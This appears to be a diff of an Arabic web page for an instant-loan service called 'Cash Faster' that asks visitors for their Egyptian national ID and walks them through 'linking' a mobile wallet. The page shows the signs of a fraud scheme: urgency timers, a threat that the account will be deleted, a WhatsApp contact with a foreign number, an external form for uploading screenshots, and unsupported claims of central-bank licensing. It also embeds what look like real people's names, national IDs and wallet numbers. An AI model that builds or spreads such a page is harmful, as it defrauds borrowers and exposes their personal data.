@@ -2,396 +2,620 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>كاش فاستر | ربط المحفظة الذكي</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>كاش فاستر | Cash Faster - تمويل فوري آمن</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        :root {
-            --primary-neon: #00F0FF;
-            --primary-deep: #8A2BE2;
-            --accent-gold: #FFD966;
-            --accent-green: #39FF14;
-            --bg-dark: #0B0E1A;
-            --bg-glass: rgba(20, 28, 45, 0.85);
-            --text-light: #FFFFFF;
-            --text-muted: #C0C8E0;
-            --border-glow: 0 0 12px rgba(0, 240, 255, 0.4);
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
+
+        :root {
+            --emerald: #2ECC71;
+            --emerald-dark: #27ae60;
+            --emerald-glow: rgba(46, 204, 113, 0.4);
+            --deep-blue: #1A2A3A;
+            --royal-gold: #D4AF37;
+            --royal-gold-light: #F3D572;
+            --dark-bg: #0F172A;
+            --glass-bg: rgba(15, 23, 42, 0.7);
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --text-light: #F8FAFC;
+            --text-muted: #94A3B8;
+            --danger: #EF4444;
+        }
+
         body {
             font-family: 'Cairo', sans-serif;
-            background: radial-gradient(circle at 20% 30%, #0C1122, #020617);
+            background: radial-gradient(ellipse at 30% 40%, #0F172A, #020617);
             color: var(--text-light);
             min-height: 100vh;
             overflow-x: hidden;
             position: relative;
         }
-        body::before {
-            content: '';
+
+        .bg-animation {
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background-image: linear-gradient(rgba(0, 240, 255, 0.08) 1px, transparent 1px),
-                              linear-gradient(90deg, rgba(0, 240, 255, 0.08) 1px, transparent 1px);
-            background-size: 45px 45px;
-            pointer-events: none;
-            animation: drift 25s linear infinite;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             z-index: 0;
+            overflow: hidden;
         }
-        @keyframes drift { 0% { transform: translate(0,0); } 100% { transform: translate(45px,45px); } }
-        .container { max-width: 1100px; margin: 0 auto; padding: 1.5rem; position: relative; z-index: 2; }
-        header {
-            text-align: center;
-            margin-bottom: 2rem;
-            background: rgba(11, 18, 35, 0.7);
-            backdrop-filter: blur(18px);
-            border-radius: 2rem;
-            padding: 1rem;
-            border: 1px solid var(--primary-neon);
-            box-shadow: 0 0 25px rgba(0, 240, 255, 0.3);
+
+        .bg-animation::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 20% 50%, rgba(46, 204, 113, 0.08) 0%, transparent 50%);
+            animation: slowDrift 30s linear infinite;
         }
-        .logo h1 { font-size: 2.4rem; background: linear-gradient(135deg, #FFF, var(--primary-neon), var(--primary-deep)); -webkit-background-clip: text; background-clip: text; color: transparent; font-weight: 800; }
-        .logo-sub { color: var(--accent-gold); font-size: 0.85rem; margin-top: 0.4rem; }
-        .security-badge { display: inline-block; background: rgba(0, 240, 255, 0.2); border: 1px solid var(--primary-neon); color: var(--primary-neon); border-radius: 2rem; padding: 0.3rem 1.2rem; font-size: 0.7rem; font-weight: 700; margin-top: 0.8rem; }
-        .search-card {
-            background: var(--bg-glass);
+
+        .bg-animation::after {
+            content: '';
+            position: absolute;
+            width: 150%;
+            height: 150%;
+            background: radial-gradient(circle at 80% 80%, rgba(212, 175, 55, 0.06) 0%, transparent 60%);
+            animation: slowDriftReverse 25s linear infinite;
+        }
+
+        @keyframes slowDrift {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(-10%, -10%); }
+        }
+
+        @keyframes slowDriftReverse {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(10%, 10%); }
+        }
+
+        .grid-particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(46, 204, 113, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(46, 204, 113, 0.05) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+            z-index: 0;
+            animation: gridMove 20s linear infinite;
+        }
+
+        @keyframes gridMove {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(50px, 50px); }
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            max-width: 1300px;
+            margin: 0 auto;
+            padding: 1.2rem;
+        }
+
+        .glass-header {
+            background: rgba(26, 42, 58, 0.5);
             backdrop-filter: blur(16px);
+            border-radius: 2.5rem;
+            padding: 1rem 2rem;
+            margin-bottom: 2rem;
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .logo-area h1 {
+            font-size: 2rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, #FFFFFF, var(--emerald), var(--royal-gold));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+        }
+
+        .logo-area p {
+            font-size: 0.7rem;
+            color: var(--royal-gold);
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+        }
+
+        .trust-badge {
+            display: flex;
+            gap: 1rem;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 0.5rem 1.2rem;
+            border-radius: 3rem;
+            font-size: 0.75rem;
+            align-items: center;
+        }
+
+        .trust-badge i {
+            color: var(--emerald);
+        }
+
+        .hero-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
             border-radius: 2rem;
             padding: 2rem;
             margin-bottom: 2rem;
-            border: 1px solid rgba(0, 240, 255, 0.5);
-            transition: 0.3s;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+            border: 1px solid rgba(46, 204, 113, 0.3);
+            box-shadow: 0 20px 35px -15px rgba(0, 0, 0, 0.5);
+            text-align: center;
         }
-        .search-title { font-size: 1.7rem; text-align: center; color: var(--primary-neon); margin-bottom: 0.5rem; }
-        .search-description { text-align: center; color: var(--text-muted); margin-bottom: 1.5rem; }
-        .input-group { max-width: 450px; margin: 0 auto; }
-        .input-group input {
+
+        .hero-title {
+            font-size: 1.9rem;
+            font-weight: 800;
+            background: linear-gradient(120deg, #fff, var(--emerald));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.5rem;
+        }
+
+        .hero-desc {
+            color: var(--text-muted);
+            margin-bottom: 1.8rem;
+            font-size: 1rem;
+        }
+
+        .search-wrapper {
+            max-width: 480px;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .search-wrapper input {
             width: 100%;
-            padding: 1rem;
-            background: rgba(0,0,0,0.6);
-            border: 2px solid var(--primary-neon);
-            border-radius: 3rem;
+            padding: 1rem 1.5rem;
+            background: rgba(0, 0, 0, 0.7);
+            border: 2px solid var(--emerald);
+            border-radius: 4rem;
             color: white;
             font-size: 1rem;
             text-align: center;
-            transition: 0.2s;
+            letter-spacing: 1px;
+            transition: all 0.2s;
         }
-        .input-group input:focus { border-color: var(--accent-gold); box-shadow: 0 0 20px var(--primary-neon); outline: none; }
-        .btn-search {
-            background: linear-gradient(95deg, var(--primary-neon), var(--primary-deep));
+
+        .search-wrapper input:focus {
+            outline: none;
+            border-color: var(--royal-gold);
+            box-shadow: 0 0 20px var(--emerald-glow);
+        }
+
+        .btn-primary {
+            background: linear-gradient(105deg, var(--emerald), var(--emerald-dark));
             border: none;
-            padding: 0.9rem;
-            border-radius: 3rem;
-            font-weight: 700;
+            padding: 0.9rem 1.8rem;
+            border-radius: 4rem;
+            font-weight: 800;
             font-size: 1.1rem;
             margin-top: 1.2rem;
             width: 100%;
-            max-width: 280px;
-            display: block;
-            margin-left: auto;
-            margin-right: auto;
-            transition: 0.2s;
-            box-shadow: 0 0 12px var(--primary-neon);
+            max-width: 260px;
             cursor: pointer;
-            color: white;
+            transition: 0.2s;
+            color: #1A2A3A;
+            box-shadow: 0 5px 15px rgba(46, 204, 113, 0.4);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.6rem;
         }
-        .btn-search:hover { transform: translateY(-3px); box-shadow: 0 0 25px var(--primary-neon); }
-        .result-card {
-            background: var(--bg-glass);
-            backdrop-filter: blur(16px);
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(46, 204, 113, 0.6);
+        }
+
+        .result-panel {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
             border-radius: 2rem;
             padding: 2rem;
-            border: 1px solid rgba(0, 240, 255, 0.5);
+            border: 1px solid rgba(212, 175, 55, 0.3);
             display: none;
-            animation: slideUp 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            animation: fadeSlideUp 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1);
         }
-        .result-card.show { display: block; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
-        .success-header {
-            background: rgba(57, 255, 20, 0.12);
-            border: 1px solid var(--accent-green);
+
+        @keyframes fadeSlideUp {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* واجهة الشطب 90 يوم */
+        .warning-deletion {
+            background: rgba(239, 68, 68, 0.2);
+            border: 2px solid var(--danger);
             border-radius: 2rem;
+            padding: 2rem;
             text-align: center;
-            padding: 1rem;
+            backdrop-filter: blur(20px);
+        }
+        .warning-deletion i {
+            font-size: 4rem;
+            color: var(--danger);
+            margin-bottom: 1rem;
+        }
+        .warning-deletion h2 {
+            color: var(--danger);
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+        }
+        .warning-deletion p {
+            font-size: 1.1rem;
             margin-bottom: 1.5rem;
+            line-height: 1.6;
         }
-        .loan-highlight {
-            background: linear-gradient(145deg, #1A2A2F, #0C1A1F);
-            border-radius: 2rem;
-            padding: 1.2rem;
+        .btn-whatsapp-urgent {
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 3rem;
+            font-weight: bold;
+            font-size: 1.2rem;
+            color: white;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.8rem;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 0.5rem;
+        }
+        .btn-whatsapp-urgent:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px #25D366;
+        }
+
+        .client-badge {
+            background: rgba(46, 204, 113, 0.15);
+            border-right: 5px solid var(--emerald);
+            padding: 1rem;
+            border-radius: 1.2rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .client-info h3 {
+            font-size: 1.4rem;
+            color: var(--royal-gold);
+        }
+
+        .loan-amount-digit {
             text-align: center;
-            border: 2px solid var(--accent-gold);
+            background: linear-gradient(145deg, #0F172A, #020617);
+            padding: 1rem;
+            border-radius: 1.8rem;
             margin: 1rem 0;
-            box-shadow: 0 0 20px rgba(255, 217, 102, 0.3);
+            border: 1px solid var(--royal-gold);
         }
-        .loan-amount { font-size: 2.3rem; font-weight: 800; color: var(--accent-gold); text-shadow: 0 0 8px gold; }
-        .info-grid {
+
+        .digit-number {
+            font-size: 2.8rem;
+            font-weight: 900;
+            color: var(--royal-gold);
+            text-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
+            letter-spacing: 2px;
+        }
+
+        .loan-details-grid {
             display: grid;
-            grid-template-columns: 1fr;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
             gap: 1rem;
             margin: 1.5rem 0;
         }
-        .info-card {
-            background: rgba(0,0,0,0.45);
-            border-radius: 1.2rem;
-            padding: 1rem;
-            border-right: 4px solid var(--primary-neon);
-        }
-        .info-card h3 {
-            color: var(--primary-neon);
-            margin-bottom: 0.8rem;
-            font-size: 1.2rem;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-        .info-table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-        .info-table tr { border-bottom: 1px solid rgba(0, 240, 255, 0.15); }
-        .info-table td { padding: 0.6rem; font-size: 0.9rem; }
-        .info-table td:first-child { font-weight: 700; color: var(--primary-neon); width: 40%; }
-        .linking-instructions {
-            background: rgba(0, 240, 255, 0.05);
-            border: 1px solid rgba(0, 240, 255, 0.4);
-            border-radius: 1.8rem;
-            padding: 1.8rem;
-            margin: 1.8rem 0;
-        }
-        .instructions-title {
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: var(--accent-gold);
-            text-align: center;
-            margin-bottom: 1.2rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.8rem;
-        }
-        .instruction-step {
+
+        .detail-card {
             background: rgba(0, 0, 0, 0.4);
             border-radius: 1.2rem;
-            padding: 1rem;
-            margin-bottom: 1rem;
-            border-left: 4px solid var(--primary-neon);
+            padding: 0.8rem;
+            text-align: center;
+            border-bottom: 2px solid var(--emerald);
         }
-        .step-header {
-            font-size: 1.1rem;
+
+        .detail-label {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+
+        .detail-value {
+            font-size: 1.2rem;
             font-weight: 700;
-            color: var(--primary-neon);
-            margin-bottom: 0.6rem;
+            color: var(--royal-gold);
+        }
+
+        .linking-guide {
+            margin-top: 2rem;
+            padding-top: 1rem;
+            border-top: 1px dashed rgba(255, 255, 255, 0.2);
+        }
+
+        .guide-title {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: var(--emerald);
             display: flex;
             align-items: center;
-            gap: 0.5rem;
+            gap: 0.6rem;
+            margin-bottom: 1rem;
         }
-        .code-box {
-            background: #0A0E1A;
-            border: 2px solid var(--accent-gold);
+
+        .step-card {
+            background: rgba(0, 0, 0, 0.5);
             border-radius: 1rem;
-            padding: 0.6rem;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            transition: 0.2s;
+        }
+
+        .step-number {
+            display: inline-block;
+            background: var(--royal-gold);
+            color: #0F172A;
+            font-weight: 800;
+            width: 28px;
+            height: 28px;
+            border-radius: 30px;
             text-align: center;
+            line-height: 28px;
+            margin-left: 0.5rem;
+        }
+
+        .code-highlight {
+            background: #0A0F1A;
+            border: 1px solid var(--royal-gold);
+            border-radius: 2rem;
+            padding: 0.5rem 1rem;
             font-family: monospace;
-            font-size: 1.3rem;
+            font-size: 1.2rem;
             font-weight: bold;
             color: gold;
+            text-align: center;
             margin-top: 0.5rem;
         }
-        .highlight-value { color: var(--accent-gold); font-weight: 800; font-size: 1.2rem; background: rgba(0,0,0,0.5); padding: 0.1rem 0.5rem; border-radius: 0.8rem; }
-        .timer-section {
-            background: radial-gradient(circle, rgba(255, 217, 102, 0.2), transparent);
-            border: 1px solid var(--accent-gold);
-            border-radius: 1.8rem;
+
+        .warning-note {
+            background: rgba(239, 68, 68, 0.15);
+            border-right: 3px solid var(--danger);
+            padding: 0.8rem;
+            border-radius: 1rem;
+            font-size: 0.85rem;
+            margin: 1rem 0;
+        }
+
+        .timer-container {
+            background: radial-gradient(circle, rgba(212, 175, 55, 0.2), transparent);
+            border-radius: 2rem;
             text-align: center;
             padding: 1rem;
-            margin: 1.2rem 0;
-            animation: timerGlow 1s infinite alternate;
+            margin: 1.5rem 0;
         }
-        @keyframes timerGlow {
-            0% { box-shadow: 0 0 5px var(--accent-gold); border-color: #ffd96688; }
-            100% { box-shadow: 0 0 25px var(--accent-gold); border-color: #ffd966; }
-        }
-        .countdown-timer {
-            font-family: monospace;
-            font-size: 2.8rem;
+
+        .countdown-clock {
+            font-size: 2.5rem;
             font-weight: 800;
-            letter-spacing: 4px;
+            font-family: monospace;
             background: #000000aa;
             display: inline-block;
-            padding: 0.4rem 1rem;
-            border-radius: 2rem;
-            color: #FFD966;
-            text-shadow: 0 0 12px #FFD966;
-            margin-top: 0.5rem;
+            padding: 0.2rem 1rem;
+            border-radius: 3rem;
+            color: var(--royal-gold);
+            letter-spacing: 5px;
         }
-        .btn-action {
-            background: linear-gradient(135deg, #FFB347, #FF8C42);
+
+        .btn-upload {
+            background: linear-gradient(135deg, #25D366, #128C7E);
             border: none;
             padding: 1rem;
             border-radius: 3rem;
             font-weight: 800;
             font-size: 1rem;
             width: 100%;
-            margin: 1rem 0;
-            cursor: pointer;
-            transition: 0.2s;
-            color: #1F1F1F;
+            color: white;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 0.5rem;
-            box-shadow: 0 4px 15px rgba(255, 140, 66, 0.4);
+            gap: 0.6rem;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 0.5rem;
         }
-        .btn-action:hover { transform: translateY(-2px); box-shadow: 0 0 25px #FFB347; }
-        .error-card { background: rgba(255, 80, 80, 0.15); border: 1px solid #FF5E5E; border-radius: 2rem; padding: 2rem; text-align: center; display: none; }
-        .loader { text-align: center; display: none; margin: 1rem; }
-        .info-section { background: rgba(0,0,0,0.5); border-radius: 1rem; padding: 0.8rem; text-align: center; font-size: 0.8rem; color: var(--text-muted); margin-top: 1rem; }
-        .footer-info { text-align: center; margin-top: 2rem; font-size: 0.75rem; color: var(--text-muted); }
 
-        .modal-overlay {
+        .btn-upload:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px #25D366;
+        }
+
+        .error-alert {
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid #EF4444;
+            border-radius: 1.5rem;
+            padding: 1.5rem;
+            text-align: center;
+            display: none;
+            margin-top: 1rem;
+        }
+
+        .footer-safe {
+            text-align: center;
+            margin-top: 2rem;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            background: rgba(0, 0, 0, 0.4);
+            padding: 1rem;
+            border-radius: 1.5rem;
+            line-height: 1.6;
+        }
+
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 1rem;
+        }
+
+        /* مودال التحذيرات الأمنية */
+        .security-modal {
             display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.85);
+            background: rgba(0, 0, 0, 0.9);
             backdrop-filter: blur(12px);
             z-index: 1000;
             justify-content: center;
             align-items: center;
-            animation: fadeInModal 0.3s ease;
+            animation: fadeIn 0.3s ease;
         }
-        @keyframes fadeInModal {
+
+        @keyframes fadeIn {
             from { opacity: 0; }
             to { opacity: 1; }
         }
-        .modal-container {
+
+        .security-modal-content {
             background: linear-gradient(145deg, #1A1F2E, #0E1220);
-            border-radius: 1.8rem;
-            max-width: 550px;
+            border-radius: 2rem;
+            max-width: 500px;
             width: 90%;
-            max-height: 85vh;
-            overflow-y: auto;
-            border: 1px solid var(--primary-neon);
-            box-shadow: 0 0 30px rgba(0, 240, 255, 0.3);
-            animation: modalSlideUp 0.3s ease;
-            direction: rtl;
+            padding: 1.5rem;
+            border: 1px solid var(--royal-gold);
+            box-shadow: 0 0 40px rgba(212, 175, 55, 0.3);
+            text-align: center;
+            animation: slideUp 0.3s ease;
         }
-        @keyframes modalSlideUp {
-            from { transform: translateY(30px); opacity: 0; }
+
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
             to { transform: translateY(0); opacity: 1; }
         }
-        .modal-header {
-            background: linear-gradient(135deg, #00F0FF20, #B85CFF20);
-            padding: 1rem 1.2rem;
-            border-bottom: 1px solid var(--primary-neon);
-            text-align: center;
-            position: sticky;
-            top: 0;
-            backdrop-filter: blur(8px);
+
+        .security-modal-content i {
+            font-size: 3rem;
+            color: var(--royal-gold);
+            margin-bottom: 1rem;
         }
-        .modal-header h3 {
-            font-size: 1.4rem;
-            color: var(--accent-gold);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.7rem;
-            margin: 0;
+
+        .security-modal-content h3 {
+            color: var(--emerald);
+            margin-bottom: 1rem;
         }
-        .modal-body {
-            padding: 1.2rem;
+
+        .security-modal-content p {
+            text-align: right;
+            margin: 0.8rem 0;
+            font-size: 0.9rem;
+            line-height: 1.5;
         }
-        .modal-footer {
-            padding: 0.8rem 1.2rem 1.2rem;
-            border-top: 1px solid rgba(0, 240, 255, 0.2);
-            text-align: center;
-        }
-        .close-modal-btn {
-            background: transparent;
+
+        .security-modal-content button {
+            background: var(--emerald);
             border: none;
-            color: var(--text-muted);
-            font-size: 0.85rem;
-            margin-top: 0.5rem;
-            cursor: pointer;
-            display: inline-block;
-        }
-        .btn-modal-upload {
-            background: linear-gradient(135deg, #25D366, #128C7E);
-            border: none;
-            padding: 0.8rem 1rem;
+            padding: 0.8rem 1.5rem;
             border-radius: 3rem;
             font-weight: bold;
             font-size: 1rem;
+            margin-top: 1rem;
             cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.6rem;
-            transition: 0.2s;
-            color: white;
+            color: #0F172A;
             width: 100%;
-            box-shadow: 0 2px 8px rgba(37, 211, 102, 0.3);
-        }
-        .btn-modal-upload:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 15px #25D366;
-        }
-        .client-summary {
-            background: rgba(0,0,0,0.5);
-            border-radius: 1rem;
-            padding: 0.6rem;
-            margin-bottom: 1rem;
-            font-size: 0.85rem;
-        }
-        .client-summary p {
-            margin: 0.3rem 0;
         }
 
         @media (max-width: 640px) {
-            .loan-amount { font-size: 1.8rem; }
-            .instructions-title { font-size: 1.2rem; }
-            .countdown-timer { font-size: 2rem; }
+            .glass-header {
+                flex-direction: column;
+                text-align: center;
+            }
+            .hero-title {
+                font-size: 1.5rem;
+            }
+            .digit-number {
+                font-size: 2rem;
+            }
+            .countdown-clock {
+                font-size: 1.8rem;
+                letter-spacing: 2px;
+            }
         }
     </style>
 </head>
 <body>
-<div class="container">
-    <header>
-        <div class="logo"><h1>⚡ Cash Faster</h1><p class="logo-sub">ربط الحساب – تمويل فوري مشفر</p></div>
-        <div class="security-badge"><i class="fas fa-shield-alt"></i> تشفير 256-bit | نظام آلي</div>
-    </header>
+<div class="bg-animation"></div>
+<div class="grid-particles"></div>
 
-    <div class="search-card">
-        <h2 class="search-title"><i class="fas fa-fingerprint"></i> تأكيد العمليات للصرف</h2>
-        <p class="search-description">أدخل الرقم القومي المكون من 14 رقمًا للدخول إلى رابط الربط</p>
-        <div class="input-group">
-            <input type="text" id="nationalId" placeholder="مثال: 28412180102258" maxlength="14" inputmode="numeric">
-            <button class="btn-search" onclick="searchCustomer()"><i class="fas fa-search"></i> الدخول الى ملفك المشفر</button>
+<div class="container">
+    <div class="glass-header">
+        <div class="logo-area">
+            <h1>⚡ Cash Faster <span style="font-size: 0.8rem;">| كاش فاستر</span></h1>
+            <p><i class="fas fa-bolt"></i> تمويل فوري - آمن وموثوق</p>
         </div>
-        <div class="loader" id="loader"><i class="fas fa-spinner fa-pulse fa-2x"></i> جاري التحقق من البيانات...</div>
+        <div class="trust-badge">
+            <span><i class="fas fa-shield-alt"></i> تشفير 256-bit</span>
+            <span><i class="fas fa-check-circle"></i> معتمد</span>
+            <span><i class="fas fa-clock"></i> صرف خلال دقائق</span>
+        </div>
     </div>
 
-    <div class="result-card" id="resultCard" style="display: none;"></div>
-    <div class="error-card" id="errorCard"><i class="fas fa-ban"></i><p>⚠️ الرقم القومي غير مسجل في نظام التمويل. يرجى التأكد أو التواصل مع الدعم.</p></div>
-    <div class="footer-info"><i class="fas fa-lock"></i> جميع الإجراءات مشفرة وفق معايير البنك المركزي | كاش فاستر © 2025</div>
+    <div class="hero-card">
+        <div class="hero-title">✨ بوابتك الذكية للتمويل الفوري</div>
+        <div class="hero-desc">أدخل رقمك القومي لاستكمال إجراءات الربط والصرف الآمن</div>
+        <div class="search-wrapper">
+            <input type="text" id="nationalId" placeholder="الرقم القومي (14 رقم)" maxlength="14" inputmode="numeric">
+            <button class="btn-primary" onclick="searchCustomer()"><i class="fas fa-fingerprint"></i> تحقق وتقدم</button>
+        </div>
+        <div class="loader" id="loader"><i class="fas fa-spinner fa-pulse fa-2x"></i> جاري تأكيد بياناتك ...</div>
+    </div>
+
+    <div id="resultPanel" class="result-panel"></div>
+    <div id="errorCard" class="error-alert"><i class="fas fa-exclamation-triangle"></i> ⚠️ الرقم القومي غير مسجل في نظام التمويل. يرجى التأكد أو التواصل مع الدعم.</div>
+    
+    <div class="footer-safe">
+        <i class="fas fa-university"></i> جميع معاملاتكم المالية تتم من خلال بوابات دفع بنكية خاضعة لرقابة البنك المركزي المصري، ومدفوعات البطاقة شغالة بنظام Paymop. كل معاملة بتتأكد برسالة من البنك بتاعك، سواء فودافون كاش أو اتصالات كاش. بياناتك كلها مشفرة بالكامل، ماحدش من خدمة العملاء يقدر يوصل لبياناتك البطاقة الخاصة بتاعتك. مرخصين من هيئة الرقابة المالية (رقم ٧٩١).<br><br>
+        <i class="fas fa-shield-alt"></i> <strong>تنبيه أمني هام:</strong><br>
+        • يجب على العميل عدم مشاركة بياناته الشخصية أو بيانات بطاقته أو محفظته مع أي شخص نهائياً، حفاظاً على أموال القرض.<br>
+        • عملية رفع التأكيدات (الصور) تتم في ملفك المشفر داخل النظام، ولا يمكن لأي شخص آخر الوصول إليه.<br>
+        • <strong>تحذير:</strong> في حالة إرسال كود OTP (رمز التحقق) لك، لا تشاركه أبداً مع أي شخص حتى لو طلب منك لحماية أموالك. فريق الدعم لا يطلب هذا الرقم أبداً.
+    </div>
 </div>
 
-<div class="modal-overlay" id="linkModal">
-    <div class="modal-container">
-        <div class="modal-header">
-            <h3><i class="fas fa-link"></i> 🧾 تعليمات ربط المحفظة</h3>
-        </div>
-        <div class="modal-body" id="modalBody"></div>
-        <div class="modal-footer">
-            <button class="btn-modal-upload" id="modalUploadBtn">
-                <i class="fas fa-upload"></i> اضغط هنا لربط ورفع سكرينات التاكيدات
-            </button>
-            <button class="close-modal-btn" onclick="closeLinkModal()"><i class="fas fa-times-circle"></i> إغلاق</button>
-        </div>
+<!-- مودال التحذيرات الأمنية -->
+<div id="securityModal" class="security-modal">
+    <div class="security-modal-content">
+        <i class="fas fa-shield-alt"></i>
+        <h3>⚠️ تنبيه أمني هام</h3>
+        <p>• يجب على العميل <strong>عدم مشاركة بياناته الشخصية</strong> أو بيانات بطاقته أو محفظته مع أي شخص نهائياً، حفاظاً على أموال القرض.</p>
+        <p>• عملية رفع التأكيدات (الصور) تتم في <strong>ملفك المشفر</strong> داخل النظام، ولا يمكن لأي شخص آخر الوصول إليه.</p>
+        <p>• <strong>تحذير:</strong> في حالة إرسال كود OTP (رمز التحقق) لك، <strong>لا تشاركه أبداً</strong> مع أي شخص حتى لو طلب منك لحماية أموالك. فريق الدعم لا يطلب هذا الرقم أبداً.</p>
+        <button onclick="closeSecurityModal()"><i class="fas fa-check-circle"></i> فهمت وأوافق</button>
     </div>
 </div>
 
@@ -455,6 +679,9 @@
 "29810012111895": { name: "محمود السيد حملى عبدالرحمن", loanRaw: "150,000", loanTerm: "48 شهر", installment: "4,205", total: "201,840", wallet: "اتصالات كاش", walletNum: "01116305548", isEtisalat: true },
 "28510232501395": { name: "على عبد الباسط عبد الرحيم يوسف", loanRaw: "100,000", loanTerm: "32 شهر", installment: "4,157", total: "133,024", wallet: "اتصالات كاش", walletNum: "01130553521", isEtisalat: true },
 "27912260300114": { name: "حازم فتحى وهبه احمد", loanRaw: "120,000", loanTerm: "38 شهر", installment: "4,235", total: "160,930", wallet: "فودافون كاش", walletNum: "01013358531", isEtisalat: false },
+// ===== العملاء الجدد من ملف 18_14 (غير مكررين) =====
+"26906032100411": { name: "عادل يوسف يوسف حمد", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "فودافون كاش", walletNum: "01060309649", isEtisalat: false },
+"27907088800084": { name: "حنان محمد محمود علي", loanRaw: "150,000", loanTerm: "48 شهر", installment: "4,205", total: "201,840", wallet: "اتصالات كاش", walletNum: "01131610079", isEtisalat: false },
 // ===== العملاء الجدد من ملف 35_31 (غير مكررين) =====
 "26801151201432": { name: "احمد السعيد محمود بدوي", loanRaw: "60,000", loanTerm: "24 شهر", installment: "3,085", total: "74,040", wallet: "فودافون كاش", walletNum: "01007723415", isEtisalat: false },
 "28512121803379": { name: "محمد مسعد عبد القادر قاسم", loanRaw: "40,000", loanTerm: "18 شهر", installment: "2,965", total: "53,370", wallet: "فودافون كاش", walletNum: "01027475098", isEtisalat: false },
@@ -467,88 +694,114 @@
 "27808230102316": { name: "مصطفى محمد سيد عبد الغني", loanRaw: "50,000", loanTerm: "24 شهر", installment: "2,725", total: "65,400", wallet: "اتصالات كاش", walletNum: "01124213383", isEtisalat: true },
 "27309260200413": { name: "أبراهيم عبدالنبي أبراهيم شعبان", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "فودافون كاش", walletNum: "01272334829", isEtisalat: false }
 };
-
     const LINKING_FORM_URL = "https://eu.surveymars.com/q/m1wgp5O9A";
-    let currentCustomer = null;
+    const WHATSAPP_SUPPORT_URL = "https://wa.me/212623042"; // رقم واتساب الدعم المالي
+    let currentClient = null;
     let countdownInterval = null;
 
-    function normalizeIdTo14(raw) {
+    function normalizeId(raw) {
         let cleaned = raw.replace(/\D/g, '');
         while (cleaned.length < 14) cleaned = '0' + cleaned;
         return cleaned;
     }
 
